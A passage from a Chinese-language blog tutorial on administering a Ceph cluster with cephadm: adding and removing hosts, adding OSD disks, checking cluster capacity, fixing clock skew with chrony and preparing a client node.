updated<br></code></pre></td></tr></table></figure><h2 id="二、ceph集群添加或移除主机"><a href="#二、ceph集群添加或移除主机" class="headerlink" title="二、ceph集群添加或移除主机"></a>二、<strong>ceph集群添加或移除主机</strong></h2><p>1.查看现有的集群主机列表</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">[root@ceph141 ~]<span class="hljs-comment"># ceph orch host ls</span><br>HOST     ADDR        LABELS  STATUS  <br>ceph141  <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.141</span>  _admin          <br><span class="hljs-number">1</span> hosts <span class="hljs-keyword">in</span> cluster<br></code></pre></td></tr></table></figure><p> 2.拷贝密钥到其他服务器上</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@ceph141</span> <span class="hljs-operator">~</span>]# ssh<span class="hljs-operator">-</span><span class="hljs-keyword">copy</span><span class="hljs-operator">-</span>id <span class="hljs-operator">-</span>f <span class="hljs-operator">-</span>i <span class="hljs-regexp">/etc/</span>ceph<span class="hljs-operator">/</span>ceph.pub ceph142<br>[root<span class="hljs-meta">@ceph141</span> <span class="hljs-operator">~</span>]# ssh<span class="hljs-operator">-</span><span class="hljs-keyword">copy</span><span class="hljs-operator">-</span>id <span class="hljs-operator">-</span>f <span class="hljs-operator">-</span>i <span class="hljs-regexp">/etc/</span>ceph<span class="hljs-operator">/</span>ceph.pub ceph143<br></code></pre></td></tr></table></figure><p>3.将密钥节点加入集群</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">[root@ceph141 ~]<span class="hljs-comment"># ceph orch host add ceph142 10.0.0.142</span><br>Added host <span class="hljs-string">&#x27;ceph142&#x27;</span> <span class="hljs-keyword">with</span> addr <span class="hljs-string">&#x27;10.0.0.142&#x27;</span><br><br>[root@ceph141 ~]<span class="hljs-comment"># ceph orch host add ceph143 10.0.0.143</span><br>Added host <span class="hljs-string">&#x27;ceph143&#x27;</span> <span class="hljs-keyword">with</span> addr <span class="hljs-string">&#x27;10.0.0.143&#x27;</span><br></code></pre></td></tr></table></figure><p>4.再次查看主机列表</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">[root@ceph141 ~]<span class="hljs-comment"># ceph orch host ls</span><br>HOST     ADDR        LABELS  STATUS  <br>ceph141  <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.141</span>  _admin          <br>ceph142  <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.142</span>                  <br>ceph143  <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.143</span>                  <br><span class="hljs-number">3</span> hosts <span class="hljs-keyword">in</span> cluster<br></code></pre></td></tr></table></figure><p>当然，也可以通过查看WebUI观察ceph集群有多少个主机。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/0f88adaa536d4c5b9d39d71a2aca5a66.png" alt="img"></p><p>5.移除主机【选做，如果你将来真有这个需求在操作】</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">[root@ceph141 ~]<span class="hljs-comment"># ceph orch host rm ceph143</span><br>Removed  host <span class="hljs-string">&#x27;ceph143&#x27;</span><br>[root@ceph141 ~]<span class="hljs-comment"># </span><br>[root@ceph141 ~]<span class="hljs-comment"># ceph orch host ls</span><br>HOST     ADDR        LABELS  STATUS  <br>ceph141  <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.141</span>  _admin          <br>ceph142  <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.142</span>                  <br><span class="hljs-number">2</span> hosts <span class="hljs-keyword">in</span> cluster<br></code></pre></td></tr></table></figure><h2 id="三、添加OSD设备到ceph集群"><a href="#三、添加OSD设备到ceph集群" class="headerlink" title="三、添加OSD设备到ceph集群"></a>三、<strong>添加OSD设备到ceph集群</strong></h2><p>1.添加OSD之前环境查看</p><p><strong>查看集群可用的设备</strong>【每个设备想要加入到集群，则其大小不得小于5GB】</p><p>如果一个设备想要加入ceph集群，要求满足2个条件:</p><p>1.设备未被使用;</p><p>2.设备的存储大小必须大于5GB;</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">[root@ceph141 ~]<span class="hljs-comment"># ceph orch device ls</span><br>HOST     PATH      TYPE  DEVICE ID                                             SIZE  AVAILABLE  REFRESHED  REJECT REASONS                               <br>ceph141  <span class="hljs-regexp">/dev/</span>sdc  hdd                                                         <span class="hljs-number">200</span>G  Yes        <span class="hljs-number">10</span>m ago                                                 <br>ceph141  <span class="hljs-regexp">/dev/</span>sr0  hdd   VMware_Virtual_SATA_CDRW_Drive_01000000000000000001  <span class="hljs-number">2006</span>M  No         <span class="hljs-number">10</span>m ago    Has a FileSystem, Insufficient space (&lt;<span class="hljs-number">5</span>GB)  <br>ceph142  <span class="hljs-regexp">/dev/</span>sdb  hdd                                                         <span class="hljs-number">100</span>G  Yes        <span class="hljs-number">4</span>m ago                                                  <br>ceph142  <span class="hljs-regexp">/dev/</span>sdc  hdd                                                         <span class="hljs-number">200</span>G  Yes        <span class="hljs-number">4</span>m ago                                                  <br>ceph142  <span class="hljs-regexp">/dev/</span>sr0  hdd   VMware_Virtual_SATA_CDRW_Drive_01000000000000000001  <span class="hljs-number">2006</span>M  No         <span class="hljs-number">4</span>m ago     Has a FileSystem, Insufficient space (&lt;<span class="hljs-number">5</span>GB)  <br>ceph143  <span class="hljs-regexp">/dev/</span>sdb  hdd                                                         <span class="hljs-number">100</span>G  Yes        <span class="hljs-number">3</span>m ago                                                  <br>ceph143  <span class="hljs-regexp">/dev/</span>sdc  hdd                                                         <span class="hljs-number">200</span>G  Yes        <span class="hljs-number">3</span>m ago                                                  <br>ceph143  <span class="hljs-regexp">/dev/</span>sr0  hdd   VMware_Virtual_SATA_CDRW_Drive_01000000000000000001  <span class="hljs-number">2006</span>M  No         <span class="hljs-number">3</span>m ago     Has a FileSystem, Insufficient space (&lt;<span class="hljs-number">5</span>GB)  <br></code></pre></td></tr></table></figure><p><strong>查看各节点的空闲设备信息</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@ceph141 ~]<span class="hljs-comment"># lsblk</span><br>....<br>sdb                         8:16  <span class="hljs-number"> 0 </span> 200G <span class="hljs-number"> 0 </span>disk <br>sdc                         8:32  <span class="hljs-number"> 0 </span> 100G <span class="hljs-number"> 0 </span>disk <br>....<br><br>[root@ceph142 ~]<span class="hljs-comment"># lsblk </span><br>NAME                      MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS<br>...<br>sdb                         8:16  <span class="hljs-number"> 0 </span> 200G <span class="hljs-number"> 0 </span>disk <br>sdc                         8:32  <span class="hljs-number"> 0 </span> 100G <span class="hljs-number"> 0 </span>disk <br>...<br><br><br>[root@ceph143 ~]<span class="hljs-comment"># lsblk </span><br>NAME                      MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS<br>...<br>sdb                         8:16  <span class="hljs-number"> 0 </span> 200G <span class="hljs-number"> 0 </span>disk <br>sdc                         8:32  <span class="hljs-number"> 0 </span> 100G <span class="hljs-number"> 0 </span>disk<br></code></pre></td></tr></table></figure><p><strong>查看OSD列表</strong></p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fortran">[root@ceph141 ~]# ceph osd tree<br>ID  <span class="hljs-keyword">CLASS</span>  WEIGHT  <span class="hljs-keyword">TYPE</span> <span class="hljs-keyword">NAME</span>     <span class="hljs-keyword">STATUS</span>  REWEIGHT  PRI-AFF<br>-<span class="hljs-number">1</span>              <span class="hljs-number">0</span>  root <span class="hljs-keyword">default</span> <br></code></pre></td></tr></table></figure><p><strong>添加OSD设备到集群</strong></p><p>此步骤会在”&#x2F;var&#x2F;lib&#x2F;ceph&#x2F;<Ceph_Cluster_ID>&#x2F;osd.<OSD_ID>&#x2F;fsid”文件中记录对应ceph的OSD编号对应本地的磁盘设备标识。</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">[root@ceph141 ~]<span class="hljs-comment"># ceph orch daemon add osd ceph141:/dev/sdb</span><br>Created osd(s) <span class="hljs-number">0</span> <span class="hljs-literal">on</span> host <span class="hljs-string">&#x27;ceph141&#x27;</span><br>[root@ceph141 ~]<span class="hljs-comment"># ceph orch daemon add osd ceph141:/dev/sdc</span><br>Created osd(s) <span class="hljs-number">1</span> <span class="hljs-literal">on</span> host <span class="hljs-string">&#x27;ceph141&#x27;</span><br>[root@ceph141 ~]<span class="hljs-comment"># ceph orch daemon add osd ceph142:/dev/sdb</span><br>Created osd(s) <span class="hljs-number">2</span> <span class="hljs-literal">on</span> host <span class="hljs-string">&#x27;ceph142&#x27;</span><br>[root@ceph141 ~]<span class="hljs-comment"># ceph orch daemon add osd ceph142:/dev/sdc</span><br>Created osd(s) <span class="hljs-number">3</span> <span class="hljs-literal">on</span> host <span class="hljs-string">&#x27;ceph142&#x27;</span><br>[root@ceph141 ~]<span class="hljs-comment"># ceph orch daemon add osd ceph143:/dev/sdb</span><br>Created osd(s) <span class="hljs-number">4</span> <span class="hljs-literal">on</span> host <span class="hljs-string">&#x27;ceph143&#x27;</span><br></code></pre></td></tr></table></figure><p> <strong>查看ceph节点的硬盘和OSD的对应关系</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@ceph141</span> <span class="hljs-operator">~</span>]# ll <span class="hljs-operator">-</span>d  <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/ceph/</span><span class="hljs-operator">*/</span>osd<span class="hljs-operator">.*</span><br>drwx<span class="hljs-operator">------</span> <span class="hljs-number">2</span> <span class="hljs-number">167</span> <span class="hljs-number">167</span> <span class="hljs-number">4096</span> <span class="hljs-type">Jan</span> <span class="hljs-number">23</span> <span class="hljs-number">11</span>:<span class="hljs-number">19</span> <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/ceph/</span>c153209c<span class="hljs-operator">-</span>d8a0<span class="hljs-operator">-</span>11ef<span class="hljs-operator">-</span>a0ed<span class="hljs-operator">-</span>bdb84668ed01<span class="hljs-regexp">/osd.0/</span><br>drwx<span class="hljs-operator">------</span> <span class="hljs-number">2</span> <span class="hljs-number">167</span> <span class="hljs-number">167</span> <span class="hljs-number">4096</span> <span class="hljs-type">Jan</span> <span class="hljs-number">23</span> <span class="hljs-number">11</span>:<span class="hljs-number">19</span> <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/ceph/</span>c153209c<span class="hljs-operator">-</span>d8a0<span class="hljs-operator">-</span>11ef<span class="hljs-operator">-</span>a0ed<span class="hljs-operator">-</span>bdb84668ed01<span class="hljs-regexp">/osd.1/</span><br><br>[root<span class="hljs-meta">@ceph141</span> <span class="hljs-operator">~</span>]# cat <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/ceph/</span><span class="hljs-operator">*/</span>osd<span class="hljs-operator">.*/</span>fsid<br>1eb45f98<span class="hljs-operator">-</span><span class="hljs-number">6058</span><span class="hljs-operator">-</span>42f2<span class="hljs-operator">-</span>a5bf<span class="hljs-operator">-</span>b034e008ac9b<br>96e33e3d<span class="hljs-operator">-</span>0acc<span class="hljs-operator">-</span>43f5<span class="hljs-operator">-</span>bcee<span class="hljs-operator">-</span>204feb1582c7<br><br><br>[root<span class="hljs-meta">@ceph142</span> <span class="hljs-operator">~</span>]# ll <span class="hljs-operator">-</span>d  <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/ceph/</span><span class="hljs-operator">*/</span>osd<span class="hljs-operator">.*</span><br>drwx<span class="hljs-operator">------</span> <span class="hljs-number">2</span> <span class="hljs-number">167</span> <span class="hljs-number">167</span> <span class="hljs-number">4096</span> <span class="hljs-type">Jan</span> <span class="hljs-number">23</span> <span class="hljs-number">11</span>:<span class="hljs-number">21</span> <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/ceph/</span>c153209c<span class="hljs-operator">-</span>d8a0<span class="hljs-operator">-</span>11ef<span class="hljs-operator">-</span>a0ed<span class="hljs-operator">-</span>bdb84668ed01<span class="hljs-regexp">/osd.2/</span><br>drwx<span class="hljs-operator">------</span> <span class="hljs-number">2</span> <span class="hljs-number">167</span> <span class="hljs-number">167</span> <span class="hljs-number">4096</span> <span class="hljs-type">Jan</span> <span class="hljs-number">23</span> <span class="hljs-number">11</span>:<span class="hljs-number">21</span> <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/ceph/</span>c153209c<span class="hljs-operator">-</span>d8a0<span class="hljs-operator">-</span>11ef<span class="hljs-operator">-</span>a0ed<span class="hljs-operator">-</span>bdb84668ed01<span class="hljs-regexp">/osd.3/</span><br><br>[root<span class="hljs-meta">@ceph142</span> <span class="hljs-operator">~</span>]# cat <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/ceph/</span><span class="hljs-operator">*/</span>osd<span class="hljs-operator">.*/</span>fsid<br>3957c37c<span class="hljs-operator">-</span>c2fe<span class="hljs-operator">-</span><span class="hljs-number">4783</span><span class="hljs-operator">-</span>984e<span class="hljs-operator">-</span>93c1184b74a3<br>b8d5b119<span class="hljs-operator">-</span>c3e3<span class="hljs-operator">-</span>4e4e<span class="hljs-operator">-</span>aab5<span class="hljs-operator">-</span>85bea49ae3ef<br><br>[root<span class="hljs-meta">@ceph143</span> <span class="hljs-operator">~</span>]# ll <span class="hljs-operator">-</span>d  <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/ceph/</span><span class="hljs-operator">*/</span>osd<span class="hljs-operator">.*</span><br>drwx<span class="hljs-operator">------</span> <span class="hljs-number">2</span> <span class="hljs-number">167</span> <span class="hljs-number">167</span> <span class="hljs-number">4096</span> <span class="hljs-type">Jan</span> <span class="hljs-number">23</span> <span class="hljs-number">11</span>:<span class="hljs-number">22</span> <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/ceph/</span>c153209c<span class="hljs-operator">-</span>d8a0<span class="hljs-operator">-</span>11ef<span class="hljs-operator">-</span>a0ed<span class="hljs-operator">-</span>bdb84668ed01<span class="hljs-regexp">/osd.4/</span><br>drwx<span class="hljs-operator">------</span> <span class="hljs-number">2</span> <span class="hljs-number">167</span> <span class="hljs-number">167</span> <span class="hljs-number">4096</span> <span class="hljs-type">Jan</span> <span class="hljs-number">23</span> <span class="hljs-number">11</span>:<span class="hljs-number">27</span> <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/ceph/</span>c153209c<span class="hljs-operator">-</span>d8a0<span class="hljs-operator">-</span>11ef<span class="hljs-operator">-</span>a0ed<span class="hljs-operator">-</span>bdb84668ed01<span class="hljs-regexp">/osd.5/</span><br><br>[root<span class="hljs-meta">@ceph143</span> <span class="hljs-operator">~</span>]# cat <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/ceph/</span><span class="hljs-operator">*/</span>osd<span class="hljs-operator">.*/</span>fsid<br>e73be677<span class="hljs-operator">-</span>e55e<span class="hljs-operator">-</span>4b54<span class="hljs-operator">-</span>b007<span class="hljs-operator">-</span>a0ed5ba07316<br>2732dd29<span class="hljs-operator">-</span><span class="hljs-number">342e-4290</span><span class="hljs-operator">-</span>ba2b<span class="hljs-operator">-</span>1b56924339ec<br></code></pre></td></tr></table></figure><p> <strong>不难发现，ceph底层是基于lvm技术磁盘的。</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/187d60c358e74fd989e12828ca90dba8.png" alt="img"></p><p>查看集群的osd总容量大小  </p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns">[root@ceph141 ~]# ceph osd tree<br>ID  CLASS  WEIGHT   TYPE NAME         STATUS  REWEIGHT  PRI-AFF<br>-<span class="hljs-number">1</span>         <span class="hljs-number">0.87895</span>  root default                               <br>-<span class="hljs-number">3</span>         <span class="hljs-number">0.29298</span>      host ceph141                           <br> <span class="hljs-number">0</span>    hdd  <span class="hljs-number">0.19530</span>          osd.<span class="hljs-number">0</span>         up   <span class="hljs-number">1.00000</span>  <span class="hljs-number">1.00000</span><br> <span class="hljs-number">1</span>    hdd  <span class="hljs-number">0.09769</span>          osd.<span class="hljs-number">1</span>         up   <span class="hljs-number">1.00000</span>  <span class="hljs-number">1.00000</span><br>-<span class="hljs-number">5</span>         <span class="hljs-number">0.29298</span>      host ceph142                           <br> <span class="hljs-number">2</span>    hdd  <span class="hljs-number">0.09769</span>          osd.<span class="hljs-number">2</span>         up   <span class="hljs-number">1.00000</span>  <span class="hljs-number">1.00000</span><br> <span class="hljs-number">3</span>    hdd  <span class="hljs-number">0.19530</span>          osd.<span class="hljs-number">3</span>         up   <span class="hljs-number">1.00000</span>  <span class="hljs-number">1.00000</span><br>-<span class="hljs-number">7</span>         <span class="hljs-number">0.29298</span>      host ceph143                           <br> <span class="hljs-number">4</span>    hdd  <span class="hljs-number">0.09769</span>          osd.<span class="hljs-number">4</span>         up   <span class="hljs-number">1.00000</span>  <span class="hljs-number">1.00000</span><br> <span class="hljs-number">5</span>    hdd  <span class="hljs-number">0.19530</span>          osd.<span class="hljs-number">5</span>         up   <span class="hljs-number">1.00000</span>  <span class="hljs-number">1.00000</span><br></code></pre></td></tr></table></figure><p><strong>查看集群大小</strong>  </p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nix">[root@ceph141 ~]<span class="hljs-comment"># ceph -s</span><br>  <span class="hljs-params">cluster:</span><br>    <span class="hljs-params">id:</span>     c153209c-d8a0-<span class="hljs-number">11</span>ef-a0ed-bdb84668ed01<br>    <span class="hljs-params">health:</span> HEALTH_WARN<br>            mon ceph141 is low on available space<br> <br>  <span class="hljs-params">services:</span><br>    <span class="hljs-params">mon:</span> <span class="hljs-number">3</span> daemons, quorum ceph141,ceph142,ceph143 (age <span class="hljs-number">26</span>m)<br>    <span class="hljs-params">mgr:</span> ceph141.iphxbv(active, since <span class="hljs-number">26</span>m), <span class="hljs-params">standbys:</span> ceph142.mxilbz<br>    <span class="hljs-params">osd:</span> <span class="hljs-number">6</span> <span class="hljs-params">osds:</span> <span class="hljs-number">6</span> up (since <span class="hljs-number">13</span>m), <span class="hljs-number">6</span> <span class="hljs-keyword">in</span> (since <span class="hljs-number">13</span>m)<br> <br>  <span class="hljs-params">data:</span><br>    <span class="hljs-params">pools:</span>   <span class="hljs-number">1</span> pools, <span class="hljs-number">1</span> pgs<br>    <span class="hljs-params">objects:</span> <span class="hljs-number">2</span> objects, <span class="hljs-number">449</span> KiB<br>    <span class="hljs-params">usage:</span>   <span class="hljs-number">161</span> MiB used, <span class="hljs-number">900</span> GiB <span class="hljs-symbol">/</span> <span class="hljs-number">900</span> GiB avail   <span class="hljs-comment">#这里是集群总大小</span><br>    <span class="hljs-params">pgs:</span>     <span class="hljs-number">1</span> active<span class="hljs-operator">+</span>clean<br></code></pre></td></tr></table></figure><p> <strong>dashbord查看</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/0c976ae7fdbf4a8597b4f0bac742eeb5.png" alt="img"></p><p><strong>ceph集群基于chrony进行同步时间</strong></p><p><strong>存在的问题</strong></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nix">[root@ceph141 ~]<span class="hljs-comment"># ceph -s</span><br>  <span class="hljs-params">cluster:</span><br>    <span class="hljs-params">id:</span>     c153209c-d8a0-<span class="hljs-number">11</span>ef-a0ed-bdb84668ed01<br>    <span class="hljs-params">health:</span> HEALTH_WARN<br>            clock skew detected on mon.ceph142<br> <br>  <span class="hljs-params">services:</span><br>    <span class="hljs-params">mon:</span> <span class="hljs-number">3</span> daemons, quorum ceph141,ceph142,ceph143 (age <span class="hljs-number">8</span>m)<br>    <span class="hljs-params">mgr:</span> ceph141.iphxbv(active, since <span class="hljs-number">8</span>m), <span class="hljs-params">standbys:</span> ceph142.mxilbz<br>    <span class="hljs-params">osd:</span> <span class="hljs-number">6</span> <span class="hljs-params">osds:</span> <span class="hljs-number">6</span> up (since <span class="hljs-number">8</span>m), <span class="hljs-number">6</span> <span class="hljs-keyword">in</span> (since <span class="hljs-number">112</span>m)<br> <br>  <span class="hljs-params">data:</span><br>    <span class="hljs-params">pools:</span>   <span class="hljs-number">1</span> pools, <span class="hljs-number">1</span> pgs<br>    <span class="hljs-params">objects:</span> <span class="hljs-number">2</span> objects, <span class="hljs-number">449</span> KiB<br>    <span class="hljs-params">usage:</span>   <span class="hljs-number">575</span> MiB used, <span class="hljs-number">899</span> GiB <span class="hljs-symbol">/</span> <span class="hljs-number">900</span> GiB avail<br>    <span class="hljs-params">pgs:</span>     <span class="hljs-number">1</span> active<span class="hljs-operator">+</span>clean<br></code></pre></td></tr></table></figure><p><strong>所有节点安装服务</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt -y <span class="hljs-keyword">install</span> chrony <br></code></pre></td></tr></table></figure><p> <strong>ceph141修改配置</strong></p><p> <strong>修改配置</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl restart chronyd</span><br></code></pre></td></tr></table></figure><p><strong>查看配置是否生效</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@ceph142</span> ~]<span class="hljs-meta"># chronyc activity -v</span><br><span class="hljs-number">200</span> OK<br><span class="hljs-number">1</span> sources online<br><span class="hljs-number">0</span> sources offline<br><span class="hljs-number">0</span> sources doing burst (<span class="hljs-keyword">return</span> <span class="hljs-keyword">to</span> online)<br><span class="hljs-number">0</span> sources doing burst (<span class="hljs-keyword">return</span> <span class="hljs-keyword">to</span> offline)<br><span class="hljs-number">7</span> sources <span class="hljs-keyword">with</span> unknown address<br></code></pre></td></tr></table></figure><p><strong>再次查看集群</strong></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix">[root@ceph141 ~]<span class="hljs-comment"># ceph -s</span><br>  <span class="hljs-params">cluster:</span><br>    <span class="hljs-params">id:</span>     c153209c-d8a0-<span class="hljs-number">11</span>ef-a0ed-bdb84668ed01<br>    <span class="hljs-params">health:</span> HEALTH_OK<br> <br>  <span class="hljs-params">services:</span><br>    <span class="hljs-params">mon:</span> <span class="hljs-number">3</span> daemons, quorum ceph141,ceph142,ceph143 (age <span class="hljs-number">8</span>m)<br>    <span class="hljs-params">mgr:</span> ceph141.iphxbv(active, since <span class="hljs-number">8</span>m), <span class="hljs-params">standbys:</span> ceph142.mxilbz<br>    <span class="hljs-params">osd:</span> <span class="hljs-number">6</span> <span class="hljs-params">osds:</span> <span class="hljs-number">6</span> up (since <span class="hljs-number">8</span>m), <span class="hljs-number">6</span> <span class="hljs-keyword">in</span> (since <span class="hljs-number">112</span>m)<br> <br>  <span class="hljs-params">data:</span><br>    <span class="hljs-params">pools:</span>   <span class="hljs-number">1</span> pools, <span class="hljs-number">1</span> pgs<br>    <span class="hljs-params">objects:</span> <span class="hljs-number">2</span> objects, <span class="hljs-number">449</span> KiB<br>    <span class="hljs-params">usage:</span>   <span class="hljs-number">575</span> MiB used, <span class="hljs-number">899</span> GiB <span class="hljs-symbol">/</span> <span class="hljs-number">900</span> GiB avail<br>    <span class="hljs-params">pgs:</span>     <span class="hljs-number">1</span> active<span class="hljs-operator">+</span>clean<br></code></pre></td></tr></table></figure><h2 id="四、ceph的管理节点配置"><a href="#四、ceph的管理节点配置" class="headerlink" title="四、ceph的管理节点配置"></a>四、ceph的管理节点配置</h2><p><strong>拷贝apt源及认证文件</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[root@ceph141 ~]# scp  /etc/apt/sources.list.d/ceph.list ceph142:/etc/apt/sources.list.d/<br>[root@ceph141 ~]# scp /etc/apt/<span class="hljs-keyword">trusted</span>.gpg.d/ceph.<span class="hljs-keyword">release</span>.gpg  ceph142:/etc/apt/<span class="hljs-keyword">trusted</span>.gpg.d/<br></code></pre></td></tr></table></figure><p><strong>客户端更新源并安装客户端节点ceph客户端软件包</strong></p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">[root@ceph142 ~]<span class="hljs-comment"># ll /etc/apt/trusted.gpg.d/ceph.release.gpg </span><br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">1143</span> Aug <span class="hljs-number">21</span> <span class="hljs-number">16</span>:<span class="hljs-number">35</span> /etc/apt/trusted.gpg.d/ceph.release.gpg<br>[root@ceph142 ~]<span class="hljs-comment"># </span><br>[root@ceph142 ~]<span class="hljs-comment"># ll /etc/apt/sources.list.d/ceph.list </span><br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">54</span> Aug <span class="hljs-number">21</span> <span class="hljs-number">16</span>:<span class="hljs-number">33</span> /etc/apt/sources.list.d/ceph.list<br>[root@ceph142 ~]<span class="hljs-comment"># </span><br>[root@ceph142 ~]<span class="hljs-comment"># apt update</span><br>[root@ceph142 ~]<span class="hljs-comment"># </span><br>[root@ceph142 ~]<span class="hljs-comment"># apt -y install ceph-common</span><br>[root@ceph142 ~]<span class="hljs-comment"># </span><br>[root@ceph142 